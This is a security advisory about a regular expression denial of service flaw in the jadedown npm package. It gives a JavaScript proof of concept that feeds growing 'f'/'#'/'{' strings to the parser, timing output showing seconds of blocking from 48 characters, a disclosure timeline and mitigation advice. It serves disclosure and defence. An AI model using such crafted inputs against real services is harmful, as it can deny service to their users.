summary: "Regular Expression Denial of Service in jadedown\nThe `jadedown` package is affected\
  \ by a regular expression denial of service vulnerability when certain types of user input\
  \ are passed in.\n\n\n### Proof of concept\n```js\nvar jadedown = require('jadedown');\n\n\
  var genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n\
  \        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=1;i<=10000000;i=i+1)\
  \ {\n    console.log(\"COUNT: \" + i);\n    var str = genstr(i, 'f') + genstr(i, '#') + '{';\n\
  \    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    jadedown(str)\n\
  \n    var end = process.hrtime(start);\n    console.log(end);\n}\n\n```\n\nResults demonstrating\
  \ blocking for 5 seconds using only 48 characters.\n\n```\n$ node jadedown.js\nCOUNT: 1\n\
  LENGTH: 6\n[ 0, 4014065 ]\nCOUNT: 4\nLENGTH: 12\n[ 0, 503507 ]\nCOUNT: 7\nLENGTH: 18\n[ 0,\
  \ 325225 ]\nCOUNT: 10\nLENGTH: 24\n[ 0, 1632684 ]\nCOUNT: 13\nLENGTH: 30\n[ 0, 7541230 ]\n\
  COUNT: 16\nLENGTH: 36\n[ 0, 80889495 ]\nCOUNT: 19\nLENGTH: 42\n[ 0, 636009936 ]\nCOUNT: 22\n\
  LENGTH: 48\n[ 5, 820586760 ]\n```\n\n# Timeline\n- October 24, 2015 - Vulnerability Identified\n\
  - October 24, 2015 - Maintainers Notified\n- October 25, 2015 - Response from Maintainers\
  \ with intent to fix\n- January 5, 2016 - Advisory Published\n- January 11, 2016 - CVE Requested\n\
  \n\n## Recommendation\n\nThis package is not actively maintained, and has not seen an update\
  \ since 2011. \n\nThe package also provides unique functionality in the form of a templating\
  \ language that is not available elsewhere. If this package is used to process user input,\
  \ the best available mitigation is to refactor the dependent application to not make use of\
  \ this module."
